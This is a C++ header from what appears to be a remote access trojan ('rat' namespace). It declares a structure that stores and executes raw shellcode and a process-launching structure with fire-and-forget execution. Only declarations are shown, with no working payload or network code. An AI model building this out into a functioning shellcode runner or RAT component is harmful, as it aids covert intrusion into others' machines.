#pragma once

#include <chrono>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <vector>
#include <filesystem>
#include <optional>

namespace rat::system::rawdogger{

/*
 * BinaryCodeTask owns its data:
 * - Copies strings and shell code
 * - Manages dynamic memory safely
 * - Provides cleanup functions
 */
 struct BinaryCodeTask {
    std::string name;
    std::vector<std::string> parameters;
    std::string response_buffer;
    std::vector<uint8_t> shell_code;

    BinaryCodeTask();
    BinaryCodeTask(const char* arg_Name);

    void setParameters(const std::vector<std::string>& arg_Parameters);
    void setParameters(std::vector<std::string>&& arg_Parameters);

    void setShellCode(const std::vector<uint8_t>& arg_Code);
    void setShellCode(std::vector<uint8_t>&& arg_Code);

    void freeParameters();
    void freeShellCode();
    void freeResponseBuffer();
    void reset();

    bool executeBinaryCodeTask();
};


} // namespace rat::system::rawdogger

namespace rat::system {

struct Process {
    // --- Process configuration ---
    std::filesystem::path path;                      // executable path
    std::string command;                             // optional command string
    std::vector<std::string> arguments;             // command-line arguments
    std::optional<std::chrono::milliseconds> timeout; // max execution time; nullopt = fire-and-forget

    // --- Execution results ---
    std::string response;                            // captured stdout/stderr
    int exit_code = -1;                               // process exit code
    bool running = false;                            // is process currently running

    // --- Constructors ---
    Process() = default;
    Process(const std::filesystem::path& Execution_Path, 
            const std::vector<std::string>& arg_Args = {},
            const std::optional<std::chrono::milliseconds>& t = std::nullopt);

    // --- Process control methods ---
    bool start();             // launch and wait (honoring timeout if set)
    bool fireAndForget();     // launch without waiting
    void kill();              // terminate the process if running
    bool wait();              // wait for process to complete (blocking)
    
    // --- Utilities ---
    void clear();             // clear response, reset exitCode and running flag
};
}//namespace rat::system
